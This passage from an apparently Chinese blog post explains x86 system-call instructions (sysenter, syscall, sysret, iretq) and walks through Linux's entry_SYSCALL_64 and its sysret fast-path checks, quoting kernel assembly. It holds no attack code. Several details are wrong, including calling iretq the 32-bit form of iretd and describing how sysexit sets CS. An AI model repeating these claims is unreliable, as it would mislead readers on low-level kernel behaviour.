<li>用户态 <code>EIP</code></li>
</ul>
</li>
</ul>
</li>
<li><p><strong>跳转到中断处理程序</strong></p>
<ul>
<li>将描述符中的段选择子加载到 <code>CS</code>。</li>
<li>将描述符中的偏移地址加载到 <code>EIP</code>，跳转到目标处理程序入口。</li>
<li>清除或保留 <code>IF</code> 标志<ul>
<li>如果描述符类型是 <strong>中断门</strong>，清除 <code>IF</code> 标志，屏蔽中断。</li>
<li>如果是 <strong>陷阱门</strong>，保留 <code>IF</code> 标志，允许嵌套中断。</li>
</ul>
</li>
</ul>
</li>
</ol>
<h5 id="sysenter"><a href="#sysenter" class="headerlink" title="sysenter"></a>sysenter</h5><p>由于中断指令 <code>int</code> 本身就不是为系统调用而设计的，因此 <code>int 0x80</code> 方式涉及查询中断向量表、权限判断等复杂且没有必要的操作，这对于系统调用这种频繁使用的功能来说会带来很大的开销。因此就有了专门用于系统调用的指令 <code>sysenter</code> 。</p>
<p>在内核初始化时，操作系统会配置以下 MSR 寄存器，为 <code>sysenter</code> 指令设置入口（这些寄存器需要在内核态配置，用户态无法直接访问）：</p>
<table>
<thead>
<tr>
<th><strong>寄存器</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>SYSENTER_CS_MSR</code></strong></td>
<td>指定内核代码段选择子，通常设置为内核代码段（<code>0x10</code>）。</td>
</tr>
<tr>
<td><strong><code>SYSENTER_EIP_MSR</code></strong></td>
<td>指定内核入口地址，指向内核的系统调用入口函数（如 Linux 中的 <code>system_call</code> 或 <code>sysenter_entry</code>）。</td>
</tr>
<tr>
<td><strong><code>SYSENTER_ESP_MSR</code></strong></td>
<td>指定内核栈的初始栈指针。</td>
</tr>
</tbody></table>
<p>当用户态程序执行 <code>sysenter</code> 指令时，CPU 直接进行如下操作完整权限和栈切换以及代码跳转：</p>
<ol>
<li><p><strong>设置目标代码段和指令指针</strong>：</p>
<ul>
<li>将 <code>SYSENTER_CS_MSR</code> 中的值加载到 <code>CS</code>。</li>
<li>将 <code>SYSENTER_EIP_MSR</code> 的值加载到 <code>EIP</code>，跳转到内核的入口函数。</li>
</ul>
</li>
<li><p><strong>设置目标栈指针</strong>：</p>
<ul>
<li>将 <code>SYSENTER_ESP_MSR</code> 的值加载到 <code>ESP</code>，切换到内核栈。</li>
</ul>
</li>
</ol>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p><code>sysenter</code> 寄存器不保存寄存器，因此为了能正确返回用户态，需要在系统调用前的用户代码中保存 <code>EIP</code> 和 <code>ESP</code> 到指定寄存器中。</p>
<div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">lea</span> <span class="built_in">edx</span>, [next_instruction]   <span class="comment">; 保存返回的 EIP</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ecx</span>, <span class="built_in">esp</span>                  <span class="comment">; 保存返回的 ESP</span></span><br><span class="line">  <span class="keyword">sysenter</span>                      <span class="comment">; 执行系统调用</span></span><br><span class="line"><span class="symbol">next_instruction:</span></span><br><span class="line">  ...</span><br></pre></td></tr></table></figure></div>

<p>因为 <code>sysenter</code> 需要用户态程序的配合导致兼容性很差，因此 intel 的这一方案没有被操作系统采用。进入 64 位后 AMD 推出的 <code>syscall</code> 吸取了这个教训，因此能够在 64 位操作系统中一统江湖。</p>

    </div>
  </div>

<h4 id="返回用户态指令"><a href="#返回用户态指令" class="headerlink" title="返回用户态指令"></a>返回用户态指令</h4><h5 id="retf（远返回指令）"><a href="#retf（远返回指令）" class="headerlink" title="retf（远返回指令）"></a>retf（远返回指令）</h5><p><code>retf</code> 是用于跨段（特权级）返回的指令，在 x86 中用来从调用门（Call Gate）或其他改变段选择子的特权切换中返回。具体执行过程为：</p>
<ol>
<li><strong>恢复用户态</strong>：<ul>
<li>CPU 从当前栈中弹出 <code>EIP</code> 和 <code>CS</code>，更新当前的代码段和指令寄存器。</li>
</ul>
</li>
<li><strong>根据特权级切换栈</strong>：<ul>
<li>如果 <code>CS</code> 中的 CPL（Current Privilege Level）与当前特权级不同，则说明发生了特权级切换，CPU 从当前栈中弹出<code>SS</code> 和 <code>ESP</code> 切换到用户态栈。</li>
<li>如果特权级相同，则继续执行，不切换栈。</li>
</ul>
</li>
</ol>
<h5 id="iretd（中断返回指令）"><a href="#iretd（中断返回指令）" class="headerlink" title="iretd（中断返回指令）"></a>iretd（中断返回指令）</h5><p><code>iretd</code> 是中断处理程序返回用户态时最常用的指令，用于恢复中断发生前的寄存器状态。具体执行过程为：</p>
<ol>
<li><strong>恢复用户态</strong>：<ul>
<li>CPU 从栈中依次弹出以下内容：<ul>
<li><code>EIP</code>（指令寄存器）：恢复中断发生时的指令地址。</li>
<li><code>CS</code>（代码段选择子）：恢复用户态代码段。</li>
<li><code>EFLAGS</code>（标志寄存器）：恢复中断前的状态标志。</li>
</ul>
</li>
</ul>
</li>
<li><strong>检查 CS 寄存器的有效性</strong>:<ul>
<li><strong>段存在检查</strong>：确保段描述符存在位是设置的，即段实际存在于内存中。</li>
<li><strong>类型检查</strong>：确保描述符类型适用于代码执行，例如，不能是数据段或其他非执行类型的段。</li>
<li><strong>权限检查</strong>：确保代码段的 DPL 至少与 <code>CS</code> 选择子的请求特权级（RPL）一致。</li>
</ul>
</li>
<li><strong>根据特权级切换栈</strong>：<ul>
<li>如果 <code>CS</code> 中的 CPL（Current Privilege Level）不等于当前特权级，则说明发生了特权级切换，CPU 从栈中弹出用户态的 <code>SS</code> 和 <code>ESP</code>，切换到用户态栈。</li>
</ul>
</li>
<li><strong>重新启用中断（如果需要）</strong>：<ul>
<li>如果 <code>EFLAGS</code> 中的 IF 位（中断标志）被恢复为 1，则重新启用硬件中断。</li>
</ul>
</li>
</ol>
<h5 id="sysexit（快速系统调用返回指令）"><a href="#sysexit（快速系统调用返回指令）" class="headerlink" title="sysexit（快速系统调用返回指令）"></a>sysexit（快速系统调用返回指令）</h5><p><code>sysexit</code> 是 Intel 为了优化系统调用性能而引入的快速返回指令，配合 <code>sysenter</code> 使用。具体执行过程为：</p>
<ol>
<li><strong>恢复用户态寄存器</strong>：<ul>
<li><code>EIP</code> 被设置为 <code>EDX</code> 中的值。</li>
<li><code>ESP</code> 被设置为 <code>ECX</code> 中的值。</li>
</ul>
</li>
<li><strong>切换段寄存器</strong>：<ul>
<li>将 <code>CS</code> 设置为 <code>SYSENTER_CS_MSR</code>。</li>
<li>将 <code>SS</code> 设置为 <code>SYSENTER_CS_MSR + 8</code>（内核代码段和内核数据段的选择子通常相差 <code>8</code>，因此由硬件设计直接规定）。</li>
</ul>
</li>
</ol>
<h3 id="x86-64-系统调用相关指令"><a href="#x86-64-系统调用相关指令" class="headerlink" title="x86-64 系统调用相关指令"></a>x86-64 系统调用相关指令</h3><h4 id="系统调用指令-1"><a href="#系统调用指令-1" class="headerlink" title="系统调用指令"></a>系统调用指令</h4><h5 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h5><p><code>syscall</code> 是 x86-64 架构中用户态程序进入内核态执行系统调用的主要指令，设计目的是取代传统的 <code>int</code> 或 <code>sysenter</code> 指令，提供更高效的系统调用路径。</p>
<ol>
<li><p><strong>保存寄存器</strong>：</p>
<p>为了保证在执行完系统调用后可以正确地恢复到用户态。</p>
<ul>
<li>当前的 <code>RIP</code>（用户态下一条指令的地址）被保存在 <code>RCX</code> 中。</li>
<li>当前的 <code>RFLAGS</code> 寄存器被保存在 <code>R11</code> 中。</li>
</ul>
</li>
<li><p><strong>设置寄存器</strong>：</p>
<ul>
<li><strong>标志寄存器</strong>：通过 <code>IA32_FMASK MSR</code> 定义的 <code>RFLAGS</code> 位被清除，通常包括中断标志（IF），以防止 <code>syscall</code> 执行过程中被中断。</li>
<li><strong>代码段和栈段选择子</strong>：从 <code>IA32_STAR MSR</code> 读取内核代码段（<code>CS</code>）和栈段（<code>SS</code>）选择子，并更新对应的寄存器。这不涉及栈指针 <code>RSP</code> 的改变，只是段寄存器的更新。</li>
<li><strong>指令寄存器</strong>：<code>RIP</code> 被设置为 <code>IA32_LSTAR MSR</code> 中的值，即内核定义的入口点地址。</li>
</ul>
</li>
</ol>
<h4 id="返回用户态指令-1"><a href="#返回用户态指令-1" class="headerlink" title="返回用户态指令"></a>返回用户态指令</h4><h5 id="iretq"><a href="#iretq" class="headerlink" title="iretq"></a>iretq</h5><p> <code>iretq</code>（Interrupt Return）是 x86-64 架构中用于从中断、异常或其他低特权级（如用户态）代码的调用返回的指令，是 <code>iretd</code> 的 32 位形式。</p>
<h5 id="sysret"><a href="#sysret" class="headerlink" title="sysret"></a>sysret</h5><p><code>sysret</code> 指令是 x86-64 架构中与 <code>syscall</code> 指令配套使用的指令，用于从系统调用中返回用户态。</p>
<ol>
<li><p><strong>恢复用户态寄存器</strong>：</p>
<ul>
<li><code>RIP</code> 被设置为 <code>RCX</code> 中的值。</li>
<li><code>RFLAGS </code> 被设置为 <code>R11</code> 中的值。</li>
</ul>
</li>
<li><p><strong>切换段寄存器</strong>：</p>
<ul>
<li><p><code>CS</code>（代码段寄存器）被设置为 <code>IA32_STAR MSR</code> 的用户代码段选择子加 16。这通常是 <code>STAR_MSR</code> 中指定的值，指向用户代码段。</p>
<p><code>SS</code>（栈段寄存器）被设置为用户栈段选择子，通常是 <code>STAR_MSR</code> 的用户栈段选择子加 8。</p>
</li>
</ul>
</li>
</ol>
<h3 id="Linux-系统调用内核实现"><a href="#Linux-系统调用内核实现" class="headerlink" title="Linux 系统调用内核实现"></a>Linux 系统调用内核实现</h3><p>这里仅介绍 64 位 <code>syscall</code> 指令的系统调用过程。</p>
<h4 id="系统调用入口"><a href="#系统调用入口" class="headerlink" title="系统调用入口"></a>系统调用入口</h4><h5 id="entry-SYSCALL-64"><a href="#entry-SYSCALL-64" class="headerlink" title="entry_SYSCALL_64"></a>entry_SYSCALL_64</h5><p><code>entry_SYSCALL_64</code> 是系统调用进入内核态的入口函数，定义在 <code>arch/x86/entry/entry_64.S</code> 中。具体步骤为：</p>
<ol>
<li><p><strong>切换 GS 寄存器的基地址。</strong>在用户态，<code>GS</code> 通常指向用户空间的数据结构；在内核态，<code>GS</code> 指向内核的 <code>per-CPU</code> 数据结构，因此需要切换  GS  寄存器的基地址。</p>
 <div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">swapgs</span></span><br></pre></td></tr></table></figure></div></li>
<li><p><strong>保存用户态的栈指针 rsp 到内核 TSS 的 sp2 字段。</strong>sp2 是内核中的一个暂存区域，用于存储用户态的 rsp。    </p>
 <div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">movq</span>    %rsp, PER_CPU_VAR(cpu_tss_rw + TSS_sp2)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>切换到内核地址空间</strong>（通过 <code>CR3</code> 切换页表），具体见前面 KPTI 机制。</p>
 <div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SWITCH_TO_KERNEL_CR3 scratch_reg=%rsp</span><br></pre></td></tr></table></figure></div>
<p> 实际对应的汇编代码如下：</p>
 <div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span>    <span class="built_in">rsp</span>, <span class="built_in">cr3</span></span><br><span class="line"><span class="keyword">and</span>    <span class="built_in">rsp</span>, <span class="number">0xffffffffffffe7ff</span></span><br><span class="line"><span class="keyword">mov</span>    <span class="built_in">cr3</span>, <span class="built_in">rsp</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>切换到内核栈。</strong><code>cpu_current_top_of_stack</code> 是当前 CPU 对应的内核栈顶。</p>
 <div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">movq</span>	PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>构造 struct pt_regs。</strong></p>
<blockquote>
<p><code>struct pt_regs</code> 是 Linux 内核用来保存用户态寄存器状态的一个关键结构体。它通常包含以下字段：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15, r14, r13, r12;    <span class="comment">// Callee-saved registers</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp, rbx, r11, r10;    <span class="comment">// Callee-saved and caller-saved registers</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9, r8, rax, rcx, rdx, rsi, rdi; <span class="comment">// General-purpose registers</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;             <span class="comment">// Original value of rax</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip, cs, eflags, rsp, ss; <span class="comment">// Instruction pointer, segment selectors, etc.</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>在系统调用中，内核需要构造 <code>struct pt_regs</code> 来保存用户态的寄存器状态，以便后续调试、错误处理或恢复用户态时使用。</p>
</blockquote>
<p> 这部分对应汇编代码如下：</p>
 <div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    /* Construct struct pt_regs on stack */</span><br><span class="line">    pushq	$__USER_DS				/* pt_regs-&gt;<span class="built_in">ss</span> */</span><br><span class="line">    <span class="comment">; __USER_DS 是用户态的数据段选择子，通常用于恢复用户态栈段（SS）。</span></span><br><span class="line">    pushq	PER_CPU_VAR(cpu_tss_rw + TSS_sp2)	/* pt_regs-&gt;<span class="built_in">sp</span> */</span><br><span class="line">    <span class="comment">; PER_CPU_VAR(cpu_tss_rw + TSS_sp2) 是用户态的栈指针（RSP），从 TSS 的 sp2 字段中获取。</span></span><br><span class="line">    pushq	%r11					/* pt_regs-&gt;flags */</span><br><span class="line">    <span class="comment">; r11 寄存器保存了用户态的 RFLAGS，在进入内核态时由 syscall 指令保存。</span></span><br><span class="line">    pushq	$__USER_CS				/* pt_regs-&gt;<span class="built_in">cs</span> */</span><br><span class="line">    <span class="comment">; __USER_CS 是用户态的代码段选择子，通常用于恢复用户态的代码段。</span></span><br><span class="line">    pushq	%rcx					/* pt_regs-&gt;<span class="built_in">ip</span> */</span><br><span class="line">    <span class="comment">; rcx 寄存器在 syscall 指令执行时存储了用户态的返回地址（RIP）。</span></span><br><span class="line"><span class="meta">GLOBAL</span>(entry_SYSCALL_64_after_hwframe)</span><br><span class="line">    pushq	%rax					/* pt_regs-&gt;orig_ax */</span><br><span class="line">    <span class="comment">; rax 寄存器存储了系统调用号，保存其原始值以便后续处理。</span></span><br><span class="line"></span><br><span class="line">    PUSH_AND_CLEAR_REGS <span class="built_in">rax</span>=$-ENOSYS</span><br><span class="line">    <span class="comment">; 这是一个宏，用于压入所有通用寄存器（如 r15、r14、r13 等）到栈上。</span></span><br><span class="line">    <span class="comment">; 其中 rax 寄存器实际保存的是 -ENOSYS(-38) 即 Function not implemented （功能未实现）。</span></span><br><span class="line">    <span class="comment">; -ENOSYS 属于系统调用的一个默认返回值。</span></span><br><span class="line">    <span class="comment">; 之后把 rbp rbx rcx rdx r8 r9 r10 r11 r12 r13 r14 r15 寄存器清零。</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>调用 <code>do_syscall_64</code> 函数执行分发至具体的系统调用处理函数。</p>
 <div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">movq</span>	%rax, %rdi</span><br><span class="line"><span class="keyword">movq</span>	%rsp, %rsi</span><br><span class="line"><span class="keyword">call</span>	do_syscall_64		/* returns with IRQs disabled */</span><br></pre></td></tr></table></figure></div>

<p> 其中<code>do_syscall_64</code> 函数的定义如下，因此第一个参数为系统调用号，第二个参数为 <code>pt_regs</code> 结构体地址即当前栈顶。</p>
 <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__visible <span class="type">void</span> <span class="title function_">do_syscall_64</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> nr, <span class="keyword">struct</span> pt_regs *regs)</span></span><br></pre></td></tr></table></figure></div></li>
</ol>
<h5 id="do-syscall-64"><a href="#do-syscall-64" class="headerlink" title="do_syscall_64"></a>do_syscall_64</h5><p><code>do_syscall_64</code> 函数是 Linux x86-64 平台上系统调用的核心分发和处理逻辑。这个函数的核心逻辑是根据系统调用号在 <code>sys_call_table</code> 中找到对应的处理函数并执行：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nr &amp;= __SYSCALL_MASK;</span><br><span class="line"><span class="keyword">if</span> (likely(nr &lt; NR_syscalls)) &#123;</span><br><span class="line">	nr = array_index_nospec(nr, NR_syscalls);</span><br><span class="line">	regs-&gt;ax = sys_call_table[nr](regs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>另外 <code>do_syscall_64</code> 函数中还有一些与调试（<code>ptrace</code>）、系统调用跟踪（ <code>strace</code>）相关的处理逻辑，不过这些并不重要。另外像栈偏移随机化的 <code>RANDOMIZE_KSTACK_OFFSET</code> 保护也是在这里实现的。</p>
<h4 id="系统调用返回"><a href="#系统调用返回" class="headerlink" title="系统调用返回"></a>系统调用返回</h4><h5 id="do-syscall-64-1"><a href="#do-syscall-64-1" class="headerlink" title="do_syscall_64"></a>do_syscall_64</h5><p>在 <code>do_syscall_64</code> 中，系统调用完成后会进入 <code>syscall_return_slowpath</code>：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">do_syscall_64</span><span class="params">(...)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    syscall_return_slowpath(regs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>该函数主要执行一些延迟工作（如调试器事件、审计、跟踪等），并调用其他函数（如 <code>prepare_exit_to_usermode</code>）为最终返回用户态做好准备。</p>
<h5 id="entry-SYSCALL-64-剩余部分"><a href="#entry-SYSCALL-64-剩余部分" class="headerlink" title="entry_SYSCALL_64 剩余部分"></a>entry_SYSCALL_64 剩余部分</h5><p>之后从 <code>do_syscall_64</code> 函数返回至 <code>entry_SYSCALL_64</code> 函数。<code>entry_SYSCALL_64</code> 函数的剩余部分主要做的工作是对上下文环境进行检查，判断是否存在异常，从而决定是采用<strong>快速返回路径</strong>（<code>syscall_return_via_sysret</code>）还是<strong>慢速返回路径</strong>（<code>swapgs_restore_regs_and_return_to_usermode</code>）来返回用户态。</p>
<ol>
<li><p><strong>中断返回检查</strong>，标记即将切换中断标志位（<code>IF</code> 位），为后续的返回路径准备。</p>
 <div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TRACE_IRQS_IRETQ        /* we<span class="string">&#x27;re about to change IF */</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>检查栈中保存的 rcx 和 rip 是否相等。</strong>正常情况下系统调用的时候会用 <code>rcx</code> 保存系统调用的返回地址，在初始化 <code>pt_regs</code> 的时候会把 <code>rcx</code> 放到结构体的 <code>rip</code> 字段上。因此如果 <code>rcx</code> 和 <code>rip</code> 不相等说明用户态的返回地址被恶意修改，或内核在处理过程中修改了返回上下文，此时内核会选择使用更通用的 <code>iretq</code> 返回路径（<code>swapgs_restore_regs_and_return_to_usermode</code>），因为 <code>iretq</code> 不依赖 <code>rcx</code> 和 <code>rip</code> 的一致性。</p>
<div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">movq</span>    <span class="built_in">RCX</span>(%rsp), %rcx</span><br><span class="line"><span class="keyword">movq</span>    <span class="built_in">RIP</span>(%rsp), %r11</span><br><span class="line"></span><br><span class="line">cmpq    %rcx, %r11    /* <span class="keyword">SYSRET</span> requires <span class="built_in">RCX</span> == <span class="built_in">RIP</span> */</span><br><span class="line"><span class="keyword">jne</span>     swapgs_restore_regs_and_return_to_usermode</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>检查返回地址的规范性。</strong>根据页表级数对 <code>RCX</code> 的高位进行掩码，判断返回地址是否  在 48 位或 57 位虚拟地址范围内，确保地址是规范的。如果地址非规范，跳转到慢速路径。</p>
 <div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#ifdef CONFIG_X86_5LEVEL</span><br><span class="line">    ALTERNATIVE <span class="string">&quot;shl $(64 - 48), %rcx; sar $(64 - 48), %rcx&quot;</span>, \</span><br><span class="line">        <span class="string">&quot;shl $(64 - 57), %rcx; sar $(64 - 57), %rcx&quot;</span>, X86_FEATURE_LA57</span><br><span class="line">#else</span><br><span class="line">    <span class="keyword">shl</span>	$(<span class="number">64</span> - (__VIRTUAL_MASK_SHIFT+<span class="number">1</span>)), %rcx</span><br><span class="line">    <span class="keyword">sar</span>	$(<span class="number">64</span> - (__VIRTUAL_MASK_SHIFT+<span class="number">1</span>)), %rcx</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">    /* If this changed %rcx, it was <span class="keyword">not</span> canonical */</span><br><span class="line">    cmpq	%rcx, %r11</span><br><span class="line">    <span class="keyword">jne</span>	swapgs_restore_regs_and_return_to_usermode</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>代码段选择子检查</strong>，检查栈中保存的代码段选择子（<code>CS</code>）是是用户态的段选择子（0x33）。</p>
 <div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmpq    $__USER_CS, <span class="built_in">CS</span>(%rsp)        /* <span class="built_in">CS</span> must match <span class="keyword">SYSRET</span> */</span><br><span class="line"><span class="keyword">jne</span>     swapgs_restore_regs_and_return_to_usermode</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>检查栈中保存的 r11 和 rflags 是否相等。</strong>和检查栈中保存的 rcx 和 rip 是否相等原因相同。</p>
 <div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">movq</span>    <span class="built_in">R11</span>(%rsp), %r11</span><br><span class="line">cmpq    %r11, EFLAGS(%rsp)        /* <span class="built_in">R11</span> == RFLAGS */</span><br><span class="line"><span class="keyword">jne</span>     swapgs_restore_regs_and_return_to_usermode</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>特殊标志位检查。</strong>检查 <code>RFLAGS</code> 中的 <code>RF</code>（恢复标志）和 <code>TF</code>（单步调试标志），如果设置了这些标志，<code>sysret</code> 无法正确处理，需要跳转到慢速路径。</p>
 <div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">testq    $(X86_EFLAGS_RF|X86_EFLAGS_TF), %r11</span><br><span class="line"><span class="keyword">jnz</span>      swapgs_restore_regs_and_return_to_usermode</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>栈段选择子检查。</strong>检查栈段选择子（<code>SS</code>）是否为用户态数据段选择子（0x2b）。</p>
 <div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmpq    $__USER_DS, <span class="built_in">SS</span>(%rsp)        /* <span class="built_in">SS</span> must match <span class="keyword">SYSRET</span> */</span><br><span class="line"><span class="keyword">jne</span>     swapgs_restore_regs_and_return_to_usermode</span><br></pre></td></tr></table></figure></div></li>
</ol>
<h5 id="快速返回路径：syscall-return-via-sysret"><a href="#快速返回路径：syscall-return-via-sysret" class="headerlink" title="快速返回路径：syscall_return_via_sysret"></a>快速返回路径：syscall_return_via_sysret</h5><p><code>syscall_return_via_sysret</code> 是快速返回路径的实现，通过高效的 <code>sysret</code> 指令从内核态返回用户态。</p>
<ol>
<li><p><strong>从栈上恢复通用寄存器。</strong></p>
<ul>
<li><code>pop_rdi=0</code>：<code>RDI</code> 寄存器不在此处恢复，因为后续切换栈到跳板栈时要用 <code>rdi</code> 暂时保存原本内核的栈顶。</li>
<li><code>skip_r11rcx=1</code>：跳过恢复 <code>R11</code> 和 <code>RCX</code>，因为在 <code>entry_SYSCALL_64</code> 的相关检查中它们已经被恢复（实际上对应的位置被 <code>pop rsi</code> 填充）。</li>
</ul>
 <div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POP_REGS pop_rdi=<span class="number">0</span> skip_r11rcx=<span class="number">1</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>保存旧栈指针并切换到跳板栈。</strong></p>
<blockquote>
<p><strong>跳板栈（trampoline stack）</strong>：</p>
<ul>
<li>跳板栈是每个 CPU 专属的栈，用于返回用户态时的中间处理。</li>
<li>切换到跳板栈有助于清理返回路径，避免使用用户态或内核态栈。</li>
<li><code>PER_CPU_VAR(cpu_tss_rw + TSS_sp0)</code>：指向当前 CPU 的跳板栈指针。</li>
</ul>
</blockquote>
 <div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">movq</span>	%rsp, %rdi  <span class="comment">; 将当前栈指针（%rsp）保存到 RDI 中，供后续切换栈时使用。</span></span><br><span class="line"><span class="keyword">movq</span>	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp	<span class="comment">; 切换到跳板栈</span></span><br></pre></td></tr></table></figure></div>

</li>
<li><p><strong>切换到用户页表。</strong>在这之前需要先将原本内核栈中保存的 rsp 和 rdi 保存到跳板栈中，因为这 <code>rdi</code> 寄存器在切换页表时会用到；<code>rsp</code> 寄存器在恢复 <code>rdi</code> 时会用到。</p>
<div class="code-container" data-rel="X86asm"><figure class="iseeu highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pushq	<span class="built_in">RSP</span>-<span class="built_in">RDI</span>(%rdi)	/* <span class="built_in">RSP</span> */</span><br><span class="line">pushq	(%rdi)		/* <span class="built_in">RDI</span> */</span><br><span class="line">SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</span><br><span class="line">popq %rdi</span><br><span class="line">popq %rsp</span><br></pre></td></tr></table></figure></div>

<p>对应的汇编代码为：</p>
